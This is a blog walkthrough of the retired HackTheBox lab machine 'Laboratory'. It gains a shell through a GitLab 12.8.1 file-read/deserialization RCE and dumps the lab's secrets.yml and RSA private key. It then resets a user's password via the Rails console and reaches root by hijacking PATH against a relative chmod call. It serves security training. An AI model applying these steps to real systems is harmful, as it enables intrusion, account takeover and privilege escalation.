---
layout: walkthrough
title: HackTheBox - Laboratory
date: 2021-04-18 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/laboratory.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Laboratory --`10.10.10.216`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Laboratory$ nmap -sC -sV 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 08:42 EST
Nmap scan report for 10.10.10.216
Host is up (0.19s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.78 seconds

```
</details>

From the output shown above, we can see that the machine is a Linux machine and I added `laboratory.htb` as well as the Alternative name -- `git.laboratory.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 3 open ports, I started by browsing to port 80 which redirected the user to the secure (port 443) site:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img1.png"  style="width: 80%" />
</p>

### Basic Web Enumeration
All of the links on the homepage seemed to just redirect to the homepage. Before continuing, I decided to start a Gobuster scan in the background, the output of which is shown below:

<details>
```bat
vagrant@ko:~/Desktop/HackTheBox/Laboratory$ sudo gobuster dir -u https://laboratory.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/09 08:55:22 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2021/03/09 09:03:26 Finished
===============================================================
```

</details>

### Exploiting Gitlab Community

While that was running, I navigated to the `Git` application and was presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img2.png"  style="width: 80%" />
</p>

In order to register, I needed to ensure that the user's email address made use of the `laboratory` domain. Once registered, I was redirected to the companies Gitlab page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img3.png"  style="width: 80%" />
</p>

I started browsing the web application and explored the projects that the user had access to, which lead me to the `SecureWebsite` project:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img4.png"  style="width: 80%" />
</p>

I now had access to the source code as well as a potential username: `Dexter McPherson`. The only other items, apart from the source code, was an issue report by `Seven`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img5.png"  style="width: 80%" />
</p>

After poking around a bit more, I realised that there wasn't anything that I could exploit at this point. I went back to the homepage and started enumeration again -- I realised that the version that was running was "GitLab Community Edition 12.8.1". A quick Google search lead me to an RCE vulnerability: <https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/>.

> This module provides remote code execution against GitLab Community Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file read to extract the Rails "secret_key_base", and gains remote code execution with a deserialization vulnerability of a signed 'experimentation_subject_id' cookie that GitLab uses internally for A/B testing.

The issue itself was found on HackerOne: <https://hackerone.com/reports/827052>, the exploit above basically uses the fact that the `UploadsRewriter` does not validate the file name in order to exploit the vulnerability by exploiting a serialization vulnerability using the secret key from the `secrets.yml` file which is provided below:

<details>

```text
cat ../etc/secrets.yml                          
# This file is managed by gitlab-ctl. Manual changes will be                                                      # erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.                                                                                                                          
---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59
528fb35b170a1b9d5ce620bc11838                            
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4
c3adbe2cc7b65003510e4031e164137b3                        
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac0117
1d62f4e225d61e0b84263903fd06af                           
  openid_connect_signing_key: |

-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
</details>

There was a git project for this exploit, so I decided to download the project and run it: <https://github.com/dotPY-hax/gitlab_RCE>.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img6.png"  style="width: 80%" />
</p>

After successfully running the exploit, I managed to obtain a shell on the machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img7.png"  style="width: 80%" />
</p>

## Lateral Movement using Git
Now that I had a foothold on the machine, I performed some basic enumeration, the output of which is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Laboratory$ nc -nlvp 42069
listening on [any] 42069 ...
connect to [10.10.14.93] from (UNKNOWN) [10.10.10.216] 52532
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux git.laboratory.htb 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
git.laboratory.htb
 
id
uid=998(git) gid=998(git) groups=998(git)
 
ifconfig:
 
groups:
git
```
</details>

After running some basic enumeration with linpeas, it turned out that I was in a docker container. Since I was in the Gitlab repository and I didn't have any privileges, I decided to make use of `gitlab-rails console`. Since I was the `Git` user, I effectively had the ability to alter settings within Gitlab. Gitlab has a decent cheat sheet which I used during this phase: <https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html>. 

Since I knew there was a `Dexter` user, my idea was to locate that user and change the password to a password that I knew. The commands that I made use of are shown below:

```ruby
user = User.where(id: 1).first
user.password = 'hotshoto'
user.password_confirmation = 'hotshoto'
user.save!
```
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img8.png"  style="width: 80%" />
</p>

With the password successfully changed, I was able to log into the application as `dexter`. After browsing the Gitlab projects, I realised that I now had access to the `SecureDocker` project which contained Dexter's SSH key. I downloaded the key and I was able to successfully authenticate to the host via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img9.png"  style="width: 80%" />
</p>

An alternative method to the example above would have been to set the `Admin` token for my user and use the newly assigned privileges to gain administrative rights within the Gitlab instance.  

## Privilege Escalation using Dexter

With access to the host, I started off with some basic enumeration and I found the user's `.viminfo` file which contained the following information:

<details>

```bat
dexter@laboratory:~$ cat .viminfo
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version                                        
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8                                          
                                                                                                                  
# hlsearch on (H) or off (h):                                                                                     
~h    

# Command Line History (newest to oldest):                                                                        
:q1                                                                                                               
|2,0,1615450281,,"q1"                                                                                             
                                                                                                                  
# Search String History (newest to oldest):                                                                                                            
# Expression History (newest to oldest):
# Input Line History (newest to oldest):
# Debug Line History (newest to oldest):
# Registers:

# File marks:
'0  1  0  /usr/local/bin/docker-security
|4,48,1,0,1615450281,"/usr/local/bin/docker-security"

# Jumplist (newest first):
-'  1  0  /usr/local/bin/docker-security
|4,39,1,0,1615450281,"/usr/local/bin/docker-security"

# History of marks within files (newest to oldest):
> /usr/local/bin/docker-security
        *       1615450278      0
        "       1       0
```
</details>

What was interesting was the file marks on `usr/local/bin/docker-security`. Opening the file showed the following useful information: `chmod 700 /usr/bin/dockerchmod 660 /var/run/docker.sock`. The Binary performed execution without the use of an absolute path, so theoretically, I could have my own `chmod` file with `/bin/bash` binary to execute. In order to exploit this, I created a simple `chmod` binary in the `/tmp` folder:
```bash
#!/bin/bash
/usr//bin/bash 
```

Once I gave the binary execute permissions (`chmod +x chmod`), I added the `/tmp` directory to the environment's PATH variable:

```bat
export PATH=/tmp:$PATH 
```

Finally, I ran the docker-security binary and obtained a root shell as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img10.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.